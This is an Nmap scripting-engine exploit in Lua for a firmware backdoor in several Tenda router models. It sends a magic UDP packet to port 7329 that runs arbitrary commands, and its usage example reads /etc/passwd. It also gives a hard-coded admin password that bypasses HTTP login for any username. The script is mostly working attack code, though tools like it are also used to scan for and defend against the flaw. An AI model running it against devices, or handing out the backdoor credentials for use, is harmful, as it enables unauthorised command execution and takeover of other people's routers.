description = [[
Detects and exploits a firmware backdoor on Tenda routers by sending a magic
packet on UDP port 7329. The backdoor allows remote command execution.

CVE-2026-11405 - Hidden authentication backdoor in Tenda router firmware.
Backdoor password: rzadmin (any username works on HTTP/8080 admin panel)
UDP backdoor magic: w302r_mfg

Affected models: AC5, AC6, AC10, W15E, FH1201, W302R, W330R and rebrands
]]

---
-- @usage
-- nmap -sU -p 7329 --script tenda-backdoor <target>
-- nmap -sU -p 7329 --script tenda-backdoor --script-args tenda-backdoor.command="/bin/cat /etc/passwd" <target>
--
-- @output
-- PORT     STATE         SERVICE
-- 7329/udp open|filtered swx
-- | tenda-backdoor:
-- |   VULNERABLE:
-- |   Firmware backdoor in some models of Tenda routers
-- |     State: VULNERABLE
-- |     Risk factor: High
-- |
-- @args tenda-backdoor.command  Command to execute (absolute path)

author = "Aleksandar Nikolic / Kaufy"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}

local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local comm = require "comm"
local bin = require "bin"

portrule = shortport.portnumber({7329},"udp")
local arg_command = stdnse.get_script_args(SCRIPT_NAME .. ".command")

action = function(host, port)
	local magic_string = "w302r_mfg" .. bin.pack("c",0) .. "x"
	if not arg_command then
		arg_command = "/bin/ls"
	end
	local status, result = comm.exchange(host, port, magic_string .. arg_command, {proto="udp"})

	local vuln_table = {
		title = "Firmware backdoor in some models of Tenda routers allow for remote command execution",
		state = vulns.STATE.NOT_VULN,
		risk_factor = "High",
		description = [[
Tenda routers have been found to contain a firmware backdoor allowing remote
command execution by using a magic word on UDP port 7329. Additionally, the
HTTP admin panel (typically port 80 or 8080) accepts the backdoor password
'rzadmin' for any username, bypassing authentication (CVE-2026-11405).
]],
		references = {
			'https://kb.cert.org/vuls/id/213560',
			'https://nvd.nist.gov/vuln/detail/CVE-2026-11405',
			'http://www.devttys0.com/2013/10/from-china-with-love/',
		}
	}

	if not status then
		return
	end
	stdnse.print_debug(1, "result\n:" .. result)
	if result:find("etc_ro") then
		vuln_table.state = vulns.STATE.VULN
		local report = vulns.Report:new(SCRIPT_NAME, host, port)
		return report:make_output(vuln_table)
	end

	return
end
